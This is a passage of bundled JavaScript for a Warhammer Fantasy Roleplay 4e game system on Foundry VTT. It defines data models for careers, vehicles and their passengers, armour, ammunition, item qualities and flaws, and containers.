        // If the user has not opted out of auto calculation of corruption, add pure soul value
        if (flags.autoCalcCorruption) {
          this.status.corruption.max += tb + wpb;
        }
    }

    computeCareer()
    {
        let currentCareer = this.currentCareer;
        if (currentCareer) {
          let { standing, tier } = this._applyStatusModifier(currentCareer.status);
          this.details.status.standing = standing;
          this.details.status.tier = tier;
          this.details.status.value = game.wfrp4e.config.statusTiers[this.details.status.tier] + " " + this.details.status.standing;
        }
        else
          this.details.status.value = "";
    
        if (currentCareer) {
          let availableCharacteristics = currentCareer.characteristics;
          for (let char in this.characteristics) {
            if (availableCharacteristics.includes(char))
              this.characteristics[char].career = true;
          }
        }
    }

    get currentCareer() 
    {
        return this.parent.getItemTypes("career").find(c => c.current.value)
    }

    _handleExperienceChange(data) {
        if (foundry.utils.hasProperty(data, "system.details.experience") && !foundry.utils.hasProperty(data, "system.details.experience.log")) {
            let actorData = this.parent.toObject(); // duplicate so we have old data during callback
            new Dialog({
                content: `<p>${game.i18n.localize("ExpChangeHint")}</p><div class="form-group"><input name="reason" type="text" /></div>`,
                title: game.i18n.localize("ExpChange"),
                buttons: {
                    confirm: {
                        label: game.i18n.localize("Confirm"),
                        callback: (dlg) => { }
                    }
                },
                default: "confirm",
                close: dlg => {
                    let expLog = actorData.system.details.experience.log || [];
                    let newEntry = { reason: dlg.find('[name="reason"]').val() };
                    if (foundry.utils.hasProperty(data, "system.details.experience.spent")) {
                        newEntry.amount = data.system.details.experience.spent - actorData.system.details.experience.spent;
                        newEntry.spent = data.system.details.experience.spent;
                        newEntry.total = actorData.system.details.experience.total;
                        newEntry.type = "spent";
                    }
                    if (foundry.utils.hasProperty(data, "system.details.experience.total")) {
                        newEntry.amount = data.system.details.experience.total - actorData.system.details.experience.total;
                        newEntry.spent = actorData.system.details.experience.spent;
                        newEntry.total = data.system.details.experience.total;
                        newEntry.type = "total";
                    }

                    expLog.push(newEntry);
                    this.parent.update({ "system.details.experience.log": expLog });
                }
            }).render(true);
        }
    }

    _applyStatusModifier({ standing, tier }) {
        let modifier = this.details.status.modifier || 0;
    
        if (modifier < 0)
          this.details.status.modified = "negative";
        else if (modifier > 0)
          this.details.status.modified = "positive";
    
        let temp = standing;
        standing += modifier;
        modifier = -(Math.abs(temp));
    
        if (standing <= 0 && tier != "b") {
          standing = 5 + standing;
          if (tier == "g")
            tier = "s";
          else if (tier == "s")
            tier = "b";
    
          // If modifier is enough to subtract 2 whole tiers
          if (standing <= 0 && tier != "b") {
            standing = 5 + standing;
            tier = "b"; // only possible case here
          }
    
          if (standing < 0)
            standing = 0;
        }
        // If rock bottom
        else if (standing <= 0 && tier == "b") {
          standing = 0;
        }
        else if (standing > 5 && tier != "g") {
          standing = standing - 5;
          if (tier == "s")
            tier = "g";
          else if (tier == "b")
            tier = "s";
    
          // If modifier is enough to get you 2 whole tiers
          if (standing > 5 && tier != "g") {
            standing -= 5;
            tier = "g"; // Only possible case here
          }
        }
        return { standing, tier }
      }

      
  async checkCorruption() {

    let test;
    if (this.status.corruption.value > this.status.corruption.max) 
    {
      let skill = this.parent.has(game.i18n.localize("NAME.Endurance"), "skill");
      if (skill) 
      {
        test = await this.parent.setupSkill(skill, { title: game.i18n.format("DIALOG.MutateTitle", { test: skill.name, skipTargets: true }), mutate: true });
      }
      else {
        test = await this.parent.setupCharacteristic("t", { title: game.i18n.format("DIALOG.MutateTitle", { test: game.wfrp4e.config.characteristics["t"], skipTargets: true }), mutate: true });
      }
      await test.roll();
    }
  }

  async _registerChatAward(messageId)
  {
    let message = game.messages.get(messageId);
    if (message)
    {
      let alreadyAwarded = message.getFlag("wfrp4e", "experienceAwarded") || [];
      message.setFlag("wfrp4e", "experienceAwarded", alreadyAwarded.concat(this.parent.id));
    }
  }
}

let fields$r = foundry.data.fields;

class VehiclePassengersModel extends foundry.abstract.DataModel {
    static defineSchema() {
        let schema = {};
        schema.list = new fields$r.ArrayField(new fields$r.SchemaField({
            id : new fields$r.StringField(),
            count : new fields$r.NumberField({min : 0}),
            roleIds : new fields$r.ArrayField(new fields$r.DocumentIdField())
        }));
        return schema;
    }

    compute(roles)
    {
        this.list.forEach(passenger => {
            let actor = game.actors.get(passenger?.id);
            if (actor)
            {
                passenger.actor = actor,
                passenger.linked = actor.prototypeToken.actorLink,
                passenger.img = WFRP_Utility.replacePopoutPath(actor.prototypeToken.texture.src),
                passenger.roles = passenger.roleIds.map(id => roles.find(r => r.id == id)).filter(i => i);
            }
            else 
            {
                passenger.notFound = true;
                passenger.img = "systems/wfrp4e/tokens/unknown.png";
            }
        });
        roles.forEach(r => r.system.assignments = this.list.filter(passenger => passenger.roleIds.includes(r.id)));
    }

    async choose(roles=[], filter)
    {
        if (typeof roles == "string")
        {
            roles = [roles];
        }
        let passengers = this.list.filter(i => i.actor?.isOwner);
        if (roles.length)
        {
            passengers = passengers.filter(passenger => passenger.roles.some(role => roles.includes(role.name)));
        }
        if (filter)
        {
            passengers = passengers.filter(filter);
        }
        
        if (passengers.length == 0)
        {
            ui.notifications.error("ERROR.NoAvailableActors", {localize: true});
            return
        }

        if (passengers.length == 1)
        {
            return passengers[0].actor;    
        }

        return (await ItemDialog.create(passengers.map(i => i.actor), 1, game.i18n.localize("DIALOG.ChooseActor")))[0]

    }

    has(actor)
    {
        return this.list.find(i => i.id == actor.id);
    }

    get (id)
    {
        return this.list.find(i => i.id == id);
    }

    add(actor)
    {
        return this.list.concat({id : actor.id, count : 1});
    }

    remove(id)
    {
        return this.list.filter(i => i.id != id);
    }

    edit(id, data)
    {
        let list = foundry.utils.deepClone(this.list);
        let passenger = list.find(i => i.id == id);
        if (passenger)
        {
            mergeData(passenger, data);
        }
        return list;
    }

    count(id, value=1)
    {
        let list = foundry.utils.deepClone(this.list);
        let passenger = list.find(i => i.id == id);
        passenger.count += value;
        return list
    }

    addRole(id, role)
    {
        if (role instanceof Item)
        {
            role = role.id;
        }

        let list = foundry.utils.deepClone(this.list);
        let passenger = list.find(i => i.id == id);
        if (!passenger.roleIds.includes(role));
        {
            passenger.roleIds.push(role);
        }
        return list
    }

    removeRole(id, role)
    {
        if (role instanceof Item)
        {
            role = role.id;
        }

        let list = foundry.utils.deepClone(this.list);
        let passenger = list.find(i => i.id == id);
        passenger.roleIds = passenger.roleIds.filter(i => i != role);
        return list
    }

}

let fields$q = foundry.data.fields;

class VehicleStatusModel extends foundry.abstract.DataModel {
    static defineSchema() {
        let schema = {};
        schema.wounds = new fields$q.SchemaField({
            value: new fields$q.NumberField({ initial: 0 }),
            max: new fields$q.NumberField(),
        });
        schema.criticalWounds = new fields$q.SchemaField({
            value: new fields$q.NumberField({ initial: 0 }),
            max: new fields$q.NumberField(),
        });
        schema.carries = new fields$q.SchemaField({
            current: new fields$q.NumberField({ initial: 0 }),
            max: new fields$q.NumberField({ initial: 10 }),
        });
        schema.encumbrance = new fields$q.SchemaField({
            current: new fields$q.NumberField({ initial: 0 }),
            initial: new fields$q.NumberField({ initial: 0 }),
        });
        schema.morale = new fields$q.EmbeddedDataField(MoraleModel);
        schema.mood = new fields$q.EmbeddedDataField(ManannMoodModel);
        return schema;
    }

    initializeArmour()
    {
        this.ward = {value: null};
        this.armour = {
            head: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Head"),
                show: true,
            },
            body: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Body"),
                show: true
            },
            rArm: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Right Arm"),
                show: true
            },
            lArm: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Left Arm"),
                show: true
            },
            rLeg: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Right Leg"),
                show: true

            },
            lLeg: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Left Leg"),
                show: true
            },
            shield: 0,
            shieldDamage: 0
        };
    }

}

let fields$p = foundry.data.fields;

class VehicleModel extends BaseActorModel {
    static preventItemTypes = ["talent", "career", "disease", "injury", "mutation", "spell", "psychology", "skill", "prayer", "injury"];

    static defineSchema() {
        let schema = super.defineSchema();
        schema.characteristics = new fields$p.SchemaField({
            t: new fields$p.EmbeddedDataField(CharacteristicModel)
        });
        schema.status = new fields$p.EmbeddedDataField(VehicleStatusModel);
        schema.details = new fields$p.EmbeddedDataField(VehicleDetailsModel);
        schema.passengers = new fields$p.EmbeddedDataField(VehiclePassengersModel);
        schema.vehicleType = new fields$p.StringField({initial : "water"});
        schema.roles = new fields$p.ArrayField(new fields$p.ObjectField({deprecated : true})); // needed for migrating old roles
        return schema;
    }

    preCreateData(data, options) {

        let preCreateData = super.preCreateData(data, options);

        if (!data.prototypeToken)
            foundry.utils.mergeObject(preCreateData,
            {
                "prototypeToken.texture.src": "systems/wfrp4e/tokens/vehicle.png"
            });

        if (!data.img || data.img == "icons/svg/mystery-man.svg") {
            preCreateData.img = "systems/wfrp4e/tokens/vehicle.png";
        }

        return preCreateData;
    }
    
    itemIsAllowed(item) {
        let allowed = super.itemIsAllowed(item);

        // Prevent standard traits
        if (allowed && item.type == "trait")
        {
            allowed = allowed && item.system.category == "vehicle";
            if (!allowed)
            {
                ui.notifications.error("ERROR.StandardTraitsOnVehicle");
            }
        }
        return allowed
    }

    computeBase()
    {
        super.computeBase();
        this.parent.runScripts("prePrepareData", { actor: this.parent });
        this.characteristics.t.computeValue();
        this.characteristics.t.computeBonus();
        this.status.wounds.bonus = Math.floor(this.status.wounds.value / 10);
        this.details.size.value = this.details.computeSize();
        this.status.initializeArmour();
        this.passengers.compute(this.parent.itemTypes.vehicleRole);
        this.crew = this.passengers.list.filter(i => i.roles?.length > 0);
        this.status.morale.compute();
        this.status.mood.compute();
    }

    computeDerived(items, flags) {
        super.computeDerived(items, flags);
        this.parent.runScripts("prePrepareItems", {actor : this.parent });
        this.characteristics.t.computeValue();
        this.characteristics.t.computeBonus();
        this.collision = this.characteristics.t.bonus + this.status.wounds.bonus;
        this.computeEncumbrance(items, flags);
        this.details.computeMove();
        this.parent.runScripts("prepareData", { actor: this.parent });
    }


    computeEncumbrance() {
        if (!game.actors) // game.actors does not exist at startup, use existing data
        {
            game.wfrp4e.postReadyPrepare.push(this);
        }
        else 
        {
            this.status.encumbrance.current += this.details.computeCrewEncumbrance(this.passengers.list);
        }

        for (let i of this.parent.items) 
        {
            i.prepareOwnedData();
            
            if (i.encumbrance)
            {
                this.status.encumbrance.current += Number(i.encumbrance.total);
            }
        }

        this.status.encumbrance.current = Math.floor(this.status.encumbrance.current * 10) / 10;
        this.status.encumbrance.mods = this.parent.getItemTypes("vehicleMod").reduce((prev, current) => prev + current.encumbrance.total, 0);
        this.status.encumbrance.over = this.status.encumbrance.mods - this.status.encumbrance.initial;
        this.status.encumbrance.over = this.status.encumbrance.over < 0 ? 0 : this.status.encumbrance.over;

        this.status.encumbrance.max = this.status.carries.max;
        this.status.encumbrance.pct = this.status.encumbrance.over / this.status.encumbrance.max * 100;
        this.status.encumbrance.carryPct = this.status.encumbrance.current / this.status.carries.max * 100;
        if (this.status.encumbrance.pct + this.status.encumbrance.carryPct > 100) {
            this.status.encumbrance.penalty = Math.floor(((this.status.encumbrance.carryPct + this.status.encumbrance.pct) - 100) / 10); // Used in handling tests
        }
    }

    get crewEffects() 
    {
        return this.parent.effects.contents.concat(this.parent.items.contents.reduce((effects, item) => effects.concat(item.effects.contents), [])).filter(e => e.applicationData.type == "crew");
    }

    static migrateData(data)
    {
        if (data.passengers instanceof Array)
        {
            data.passengers = {
                list : data.passengers
            };
        }
    }
}

foundry.data.fields;

class NPCModel extends StandardActorModel 
{
    static preventItemTypes = [];

    static defineSchema() 
    {
        let schema = super.defineSchema();
        return schema;
    }
}

let fields$o = foundry.data.fields;

class CreatureModel extends StandardActorModel 
{
    static preventItemTypes = [];

    static defineSchema() 
    {
        let schema = super.defineSchema();
        // deprecated
        schema.excludedTraits = new fields$o.ArrayField(new fields$o.StringField());
        return schema;
    }
}

let fields$n = foundry.data.fields;

var PropertiesMixin$1 = PropertiesMixin = (cls) => class extends cls 
{
    static defineSchema() {
        let schema = super.defineSchema();
        schema.qualities = new fields$n.SchemaField({
            value: new fields$n.ArrayField(new fields$n.ObjectField({}))
        });
        schema.flaws = new fields$n.SchemaField({
            value: new fields$n.ArrayField(new fields$n.ObjectField({}))
        });
        return schema;
    }

    //#region getters

    get loading() {
        return this.properties.flaws.reload
    }

    get repeater() {
        return this.properties.qualities.repeater
    }

    get isMagical() {
        return this.properties.qualities.magical || this.properties.unusedQualities?.magical; // Should still be magical if unused
      }

    get properties() {

        if (this._properties)
        {
            return this._properties;
        }

        else return {
            qualities: this.constructor._propertyArrayToObject(this.qualities.value, game.wfrp4e.utility.qualityList()),
            flaws: this.constructor._propertyArrayToObject(this.flaws.value, game.wfrp4e.utility.flawList()),
        }
    }

    get originalProperties() {
        let properties = {
            qualities: this.constructor._propertyArrayToObject(this._source.qualities.value, game.wfrp4e.utility.qualityList()),
            flaws: this.constructor._propertyArrayToObject(this._source.flaws.value, game.wfrp4e.utility.flawList()),
            unusedQualities: {}
        };
        return properties;
    }

    get OriginalQualities() {
        let qualities = Object.values(this.originalProperties.qualities);
        let ungrouped = qualities.filter(i => !i.group).map(q => q.display);
        let grouped = [];
        let groupNums = this.QualityGroups;
        for (let g of groupNums) {
            grouped.push(qualities.filter(i => i.group == g).map(i => i.display).join(" " + game.i18n.localize("QualitiesOr") + " "));
        }
        return ungrouped.concat(grouped)
    }

    get OriginalFlaws() {
        return Object.values(this.originalProperties.flaws).map(f => f.display)
    }


    // Related to OR qualities - can choose which one is active
    get QualityGroups() {
        // return groups with no duplicates
        return Object.values(this.originalProperties.qualities)
            .map(i => i.group)
            .filter(i => Number.isNumeric(i))
            .filter((value, index, array) => {
                return array.findIndex(i => value == i) == index
            });
    }

    get Qualities() {
        return Object.values(this.properties.qualities).map(q => q.display)
    }

    get UnusedQualities() {
        return Object.values(this.properties.unusedQualities).map(q => q.display)
    }

    get InactiveQualities() {
        return Object.values(this.properties.inactiveQualities).map(q => q.display)
    }

    get Flaws() {
        return Object.values(this.properties.flaws).map(f => f.display)
    }

    //#endregion

    computeBase() {
        this._properties = null;
        super.computeBase();
    }

    computeEncumbrance() 
    {
        let enc = super.computeEncumbrance();

        if (this.properties.qualities?.lightweight && enc >= 1)
            enc -= 1 * this.quantity.value;
        if (this.properties.flaws?.bulky)
            enc += 1 * this.quantity.value;

        return enc
    }

    /**
   * 
   * @param {Object} properties properties object to add
   */
    _addProperties(properties) {
        let qualities = this.qualities.value;
        let flaws = this.flaws.value;

        for (let q in properties.qualities) {
            let hasQuality = qualities.find(quality => quality.name == q);
            if (hasQuality && properties.qualities[q].value) {
                hasQuality.value += properties.qualities[q].value;
            }
            else
                qualities.push({ name: q, value: properties.qualities[q].value });
        }
        for (let f in properties.flaws) {
            let hasQuality = flaws.find(flaw => flaw.name == f);
            if (hasQuality && properties.flaws[f].value) {
                hasQuality.value += properties.flaws[f].value;
            }
            else
                flaws.push({ name: f, value: properties.flaws[f].value });
        }
    }

    static _propertyArrayToObject(array, propertyObject) {

        let properties = {};

        // Convert quality/flaw arry into an properties object (accessible example `item.properties.qualities.accurate` or `item.properties.flaws.reload.value)
        if (array) {
            array.forEach(p => {
                if (propertyObject[p.name]) {
                    properties[p.name] = {
                        key: p.name,
                        display: propertyObject[p.name],
                        value: p.value,
                        group: p.group,
                        active: p.active
                    };
                    if (p.value)
                        properties[p.name].display += " " + (Number.isNumeric(p.value) ? p.value : `(${p.value})`);

                }
                else if (p.custom) {
                    properties[p.key] = {
                        key: p.key,
                        display: p.display
                    };
                }
                // Unrecognized
                else properties[p.name] = {
                    key: p.name,
                    display: p.name
                };
            });
        }

        return properties
    }
};

let fields$m = foundry.data.fields;

class AmmunitionModel extends PropertiesMixin$1(PhysicalItemModel)
{
    static defineSchema() 
    {
        let schema = super.defineSchema();
        schema.ammunitionType = new fields$m.SchemaField({
            value: new fields$m.StringField()
        });
        schema.range = new fields$m.SchemaField({
            value: new fields$m.StringField()
        });
        schema.damage = new fields$m.SchemaField({
            value: new fields$m.StringField()
        });
        schema.ammunitionType = new fields$m.SchemaField({
            value: new fields$m.StringField()
        });
        schema.special = new fields$m.SchemaField({
            value: new fields$m.StringField()
        });
        return schema;
    }

      // Ammunition Expansion Data
  async expandData(htmlOptions) {
    let data = await super.expandData(htmlOptions);
    let properties = [];
    properties.push(game.wfrp4e.config.ammunitionGroups[this.ammunitionType.value]);

    if (this.range.value)
      properties.push(`${game.i18n.localize("Range")}: ${this.range.value}`);

    if (this.damage.value) {
      let damage = this.damage.value;
      if (this.damage.dice)
        damage += " + " + this.damage.dice;
      properties.push(`${game.i18n.localize("Damage")}: ${damage}`);
    }

    let itemProperties = this.Qualities.concat(this.Flaws);
    for (let prop of itemProperties)
      properties.push("<a class ='item-property'>" + prop + "</a>");

    if (this.special.value)
      properties.push(`${game.i18n.localize("Special")}: ` + this.special.value);

    data.properties = properties.filter(p => !!p);
    return data;
  }

  chatData() {
    let properties = [
      `<b>${game.i18n.localize("Price")}</b>: ${this.price.gc || 0} ${game.i18n.localize("MARKET.Abbrev.GC")}, ${this.price.ss || 0} ${game.i18n.localize("MARKET.Abbrev.SS")}, ${this.price.bp || 0} ${game.i18n.localize("MARKET.Abbrev.BP")}`,
      `<b>${game.i18n.localize("Encumbrance")}</b>: ${this.encumbrance.value}`,
      `<b>${game.i18n.localize("Availability")}</b>: ${game.wfrp4e.config.availability[this.availability.value] || "-"}`
    ];

    properties.push(`<b>${game.i18n.localize("ITEM.AmmunitionType")}:</b> ${game.wfrp4e.config.ammunitionGroups[this.ammunitionType.value]}`);

    if (this.range.value)
      properties.push(`<b>${game.i18n.localize("Range")}</b>: ${this.range.value}`);

    if (this.damage.value)
      properties.push(`<b>${game.i18n.localize("Damage")}</b>: ${this.damage.value}`);

    // Make qualities and flaws clickable
    if (this.qualities.value.length)
      properties.push(`<b>${game.i18n.localize("Qualities")}</b>: ${this.OriginalQualities.map(i => i = "<a class ='item-property'>" + i + "</a>").join(", ")}`);

    if (this.flaws.value.length)
      properties.push(`<b>${game.i18n.localize("Flaws")}</b>: ${this.OriginalFlaws.map(i => i = "<a class ='item-property'>" + i + "</a>").join(", ")}`);


    properties = properties.filter(p => p != game.i18n.localize("Special"));
    if (this.special.value)
      properties.push(`<b>${game.i18n.localize("Special")}</b>: ` + this.special.value);

    properties = properties.filter(p => !!p);
    return properties;
  }

  // Ammo effects should never transfer to actors, they always append to the weapon's effects
  shouldTransferEffect(effect)
  {
    return false;
  }
}

let fields$l = foundry.data.fields;

class ArmourModel extends PropertiesMixin$1(PhysicalItemModel) {
  static defineSchema() {
    let schema = super.defineSchema();
    schema.worn = new fields$l.SchemaField({
      value: new fields$l.BooleanField()
    });
    schema.armorType = new fields$l.SchemaField({ // TODO migrate this to the "correct" spelling
      value: new fields$l.StringField()
    });
    schema.penalty = new fields$l.SchemaField({
      value: new fields$l.StringField()
    });
    schema.special = new fields$l.SchemaField({
      value: new fields$l.StringField()
    });

    schema.AP = new fields$l.SchemaField({
      head: new fields$l.NumberField({ initial: 0 }),
      lArm: new fields$l.NumberField({ initial: 0 }),
      rArm: new fields$l.NumberField({ initial: 0 }),
      lLeg: new fields$l.NumberField({ initial: 0 }),
      rLeg: new fields$l.NumberField({ initial: 0 }),
      body: new fields$l.NumberField({ initial: 0 }),
    });
    schema.APdamage = new fields$l.SchemaField({
      head: new fields$l.NumberField({ initial: 0 }),
      lArm: new fields$l.NumberField({ initial: 0 }),
      rArm: new fields$l.NumberField({ initial: 0 }),
      lLeg: new fields$l.NumberField({ initial: 0 }),
      rLeg: new fields$l.NumberField({ initial: 0 }),
      body: new fields$l.NumberField({ initial: 0 }),
    });
    return schema;
  }

  get isEquipped() {
    return this.worn.value
  }

  get isMetal() 
  {
    return ["plate", "mail", "otherMetal"].includes(this.armorType.value)
  }

  get protects() {
    let protects = {};
    for (let loc in this.AP) {
      if (this.AP[loc] > 0)
        protects[loc] = true;
      else
        protects[loc] = false;
    }
    return protects
  }

  get currentAP() {
    let currentAP = foundry.utils.deepClone(this.AP);
    for (let loc in currentAP) {
        currentAP[loc] -= this.properties.qualities.durable  // If durable, subtract its value from APDamage
                          ? Math.max(0, (this.APdamage[loc] - (this.properties.qualities.durable?.value || 0)))
                          : this.APdamage[loc];
    }
    return currentAP
  }

  async preCreateData(data, options, user) {
    let preCreateData = await super.preCreateData(data, options, user);

    if (this.parent.isOwned && this.parent.actor.type != "character" && this.parent.actor.type != "vehicle") {
      foundry.utils.setProperty(preCreateData, "system.worn.value", true); // TODO: migrate this into a unified equipped property
    }

    return preCreateData;
  }

  computeBase() {
    super.computeBase();
    this.damaged = {
      "head": false,
      "lArm": false,
      "rArm": false,
      "lLeg": false,
      "rLeg": false,
      "body": false
    };
  }

  shouldTransferEffect(effect)
  {
      return super.shouldTransferEffect(effect) && (!effect.applicationData.equipTransfer || this.isEquipped)
  }

  toggleEquip()
  {
      return this.parent.update({"system.worn.value" : !this.isEquipped})
  }

    /** 
   * Helper method to apply damage to an item
   * 
   * @param {number} value Damage the item by this amount
   * @param {Array} location Array of locations to damage
   */
    damageItem(value = 1, location=["head", "lArm", "rArm", "lLeg", "rLeg", "body"])
    {
        let update = {};
        for(let loc of location)
        {
          update[`system.APdamage.${loc}`] = Math.clamped(this.APdamage[loc] + value, 0, this.AP[loc]);
        }
        return this.parent.update(update);
    }
  
  // Armour Expansion Data
  async expandData(htmlOptions) {
    let data = await super.expandData(htmlOptions);
    let properties = [];
    properties.push(game.wfrp4e.config.armorTypes[this.armorType.value]);
    let itemProperties = this.Qualities.concat(this.Flaws);
    for (let prop of itemProperties)
      properties.push("<a class ='item-property'>" + prop + "</a>");
    properties.push(this.penalty.value);

    data.properties = properties.filter(p => !!p);
    return data;
  }

  chatData() {
    let properties = [
      `<b>${game.i18n.localize("Price")}</b>: ${this.price.gc || 0} ${game.i18n.localize("MARKET.Abbrev.GC")}, ${this.price.ss || 0} ${game.i18n.localize("MARKET.Abbrev.SS")}, ${this.price.bp || 0} ${game.i18n.localize("MARKET.Abbrev.BP")}`,
      `<b>${game.i18n.localize("Encumbrance")}</b>: ${this.encumbrance.value}`,
      `<b>${game.i18n.localize("Availability")}</b>: ${game.wfrp4e.config.availability[this.availability.value] || "-"}`
    ];

    if (this.armorType.value)
      properties.push(`<b>${game.i18n.localize("ITEM.ArmourType")}</b>: ${game.wfrp4e.config.armorTypes[this.armorType.value]}`);
    if (this.penalty.value)
      properties.push(`<b>${game.i18n.localize("Penalty")}</b>: ${this.penalty.value}`);


    for (let loc in game.wfrp4e.config.locations)
      if (this.AP[loc])
        properties.push(`<b>${game.wfrp4e.config.locations[loc]} AP</b>: ${this.currentAP[loc]}/${this.AP[loc]}`);



    // Make qualities and flaws clickable
    if (this.qualities.value.length)
      properties.push(`<b>${game.i18n.localize("Qualities")}</b>: ${this.OriginalQualities.map(i => i = "<a class ='item-property'>" + i + "</a>").join(", ")}`);

    if (this.flaws.value.length)
      properties.push(`<b>${game.i18n.localize("Flaws")}</b>: ${this.OriginalFlaws.map(i => i = "<a class ='item-property'>" + i + "</a>").join(", ")}`);


    properties = properties.filter(p => p != game.i18n.localize("Special"));
    if (this.special.value)
      properties.push(`<b>${game.i18n.localize("Special")}</b>: ` + this.special.value);

    properties = properties.filter(p => !!p);
    return properties;
  }

  
  static migrateData(data)
  {
    super.migrateData(data);
    if (data.currentAP)
    {
        data.AP = data.maxAP;
        data.APdamage = data.currentAP;

        for(let loc in data.currentAP)
        {
          if(data.currentAP[loc] == -1)
            data.APdamage[loc] = 0;
          else {
            data.APdamage[loc] = data.maxAP[loc] - data.currentAP[loc];
          }
        }
    }
  }

}

let fields$k = foundry.data.fields;

class CareerModel extends BaseItemModel
{
    static defineSchema() 
    {
        let schema = super.defineSchema();
        schema.careergroup = new fields$k.SchemaField({
            value: new fields$k.StringField()
        });
        schema.class = new fields$k.SchemaField({
            value: new fields$k.StringField()
        });
        schema.current = new fields$k.SchemaField({
            value: new fields$k.BooleanField()
        });
        schema.complete = new fields$k.SchemaField({
            value: new fields$k.BooleanField()
        });
        schema.level = new fields$k.SchemaField({
            value: new fields$k.NumberField({min: 1})
        });
        schema.status = new fields$k.SchemaField({
            standing: new fields$k.NumberField({min: 1}),
            tier: new fields$k.StringField({choices: ["b", "s", "g"]})
        });
        schema.characteristics = new fields$k.ArrayField(new fields$k.StringField());
        schema.skills = new fields$k.ArrayField(new fields$k.StringField());
        schema.talents = new fields$k.ArrayField(new fields$k.StringField());
        schema.trappings = new fields$k.ArrayField(new fields$k.StringField());
        schema.incomeSkill = new fields$k.ArrayField(new fields$k.NumberField());
        return schema;
    }


    createChecks()
    {
        if (this.parent.actor?.type == "creature") 
        {
            this.parent.actor.advanceNPC(this.parent);
        }
    }


     changeSkillName(oldName, newName) {
        let careerSkills = foundry.utils.duplicate(this.skills);

        // If career has the skill, change the name
        if (careerSkills.includes(oldName)) 
        {
            careerSkills[careerSkills.indexOf(oldName)] = newName;
        }
        else // if it doesn't, return
        {
            return;
        }

        // Ask the user to confirm the change
        new Dialog({
            title: game.i18n.localize("SHEET.CareerSkill"),
            content: `<p>${game.i18n.localize("SHEET.CareerSkillPrompt")}</p>`,
            buttons: {
                yes: {
                    label: game.i18n.localize("Yes"),
                    callback: async dlg => {
                        ui.notifications.notify(`${game.i18n.format("SHEET.CareerSkillNotif", { oldName, newName, career: this.parent.name })}`);
                        this.parent.update({ "system.skills": careerSkills });
                    }
                },
                no: {
                    label: game.i18n.localize("No"),
                    callback: async dlg => {
                        return;
                    }
                },
            },
            default: 'yes'
        }).render(true);
    }
    

    async expandData(htmlOptions) {
        let data = await super.expandData(htmlOptions);
        data.properties = [];
        data.properties.push(`<b>${game.i18n.localize("Class")}</b>: ${this.class.value}`);
        data.properties.push(`<b>${game.i18n.localize("Group")}</b>: ${this.careergroup.value}`);
        data.properties.push(game.wfrp4e.config.statusTiers[this.status.tier] + " " + this.status.standing);
        data.properties.push(`<b>${game.i18n.localize("Characteristics")}</b>: ${this.characteristics.map(i => i = " " + game.wfrp4e.config.characteristicsAbbrev[i])}`);
        data.properties.push(`<b>${game.i18n.localize("Skills")}</b>: ${this.skills.map(i => i = " " + i)}`);
        data.properties.push(`<b>${game.i18n.localize("Talents")}</b>: ${this.talents.map(i => i = " " + i)}`);
        data.properties.push(`<b>${game.i18n.localize("Trappings")}</b>: ${this.trappings.map(i => i = " " + i)}`);
        data.properties.push(`<b>${game.i18n.localize("Income")}</b>: ${this.incomeSkill.map(i => ` <a class = 'career-income' data-career-id=${this.id}> ${this.skills[i]} <i class="fas fa-coins"></i></a>`)}`);
        // When expansion data is called, a listener is added for 'career-income'
        return data;
      }

      chatData() {
        let properties = [];
        properties.push(`<b>${game.i18n.localize("Class")}</b>: ${this.class.value}`);
        properties.push(`<b>${game.i18n.localize("Group")}</b>: ${this.careergroup.value}`);
        properties.push(`<b>${game.i18n.localize("Status")}</b>: ${game.wfrp4e.config.statusTiers[this.status.tier] + " " + this.status.standing}`);
        properties.push(`<b>${game.i18n.localize("Characteristics")}</b>: ${this.characteristics.map(i => i = " " + game.wfrp4e.config.characteristicsAbbrev[i])}`);
        properties.push(`<b>${game.i18n.localize("Skills")}</b>: ${this.skills.map(i => i = " " + "<a class = 'skill-lookup'>" + i + "</a>")}`);
        properties.push(`<b>${game.i18n.localize("Talents")}</b>: ${this.talents.map(i => i = " " + "<a class = 'talent-lookup'>" + i + "</a>")}`);
        properties.push(`<b>${game.i18n.localize("Trappings")}</b>: ${this.trappings.map(i => i = " " + i)}`);
        properties.push(`<b>${game.i18n.localize("Income")}</b>: ${this.incomeSkill.map(i => " " + this.skills[i])}`);
        return properties;
      }
}

let fields$j = foundry.data.fields;

class ContainerModel extends PhysicalItemModel {
    static defineSchema() {
        let schema = super.defineSchema();
        schema.worn = new fields$j.SchemaField({
            value: new fields$j.BooleanField()
        });
        schema.wearable = new fields$j.SchemaField({
            value: new fields$j.BooleanField()
        });
        schema.carries = new fields$j.SchemaField({
            value: new fields$j.NumberField()
        });
        schema.countEnc = new fields$j.SchemaField({
            value: new fields$j.BooleanField()
        });

        return schema;
    }

    get isEquipped() {
      return this.worn.value
    }

    async preUpdateChecks(data, options, user) {
      await super.preUpdateChecks(data);
      if (getProperty(data, "system.location.value") == this.parent.id)
      {
        delete foundry.utils.setProperty(data, "system.location.value", null);
      }
  }

    updateChecks(data, options, user)
    {
        let update = super.updateChecks(data, options, user) || {};

        if (data.system?.location?.value) {
            let allContainers = this.parent.actor?.getItemTypes("container");
            if (this.formsLoop(this.parent, allContainers))
            {
              ui.notifications.error("Loop formed - Resetting Container Location");
              update["system.location.value"] = "";
            }
          }

          return update
    }


    async preDeleteChecks() {
        await super.preDeleteChecks();

        // When deleting a container, remove the flag that determines whether it's collapsed in the sheet
        if (this.parent.actor) 
        {
            // Reset the location of items inside
            let items = (this.packsInside || []).concat(this.carrying || []).map(i => i.toObject());
            for (let item of items) 
            {
                item.system.location.value = "";
            }

            await this.parent.actor.update({items, [`flags.wfrp4e.sheetCollapsed.-=${this.parent.id}`]: null });
        }
    }

    toggleEquip()
    {
        return this.parent.update({"system.worn.value" : !this.isEquipped})
    }


    formsLoop(container, containerList, stack = []) {
      if (!container.location.value)
        return false
      else if (stack.includes(container.id))
        return true
      else {
        stack.push(container.id);
        return this.formsLoop(containerList.find(c => c.id == container.location.value), containerList, stack)
      }
    }


    computeOwned()
    {
      if (!this.countEnc.value)
      {
        this.encumbrance.value = 0;
      }
    }

    computeEncumbrance() 
    {
      let enc = super.computeEncumbrance();
      if (!this.countEnc.value)
      {
        enc = 0;
      }
      return enc;
    }

    shouldTransferEffect(effect)
    {
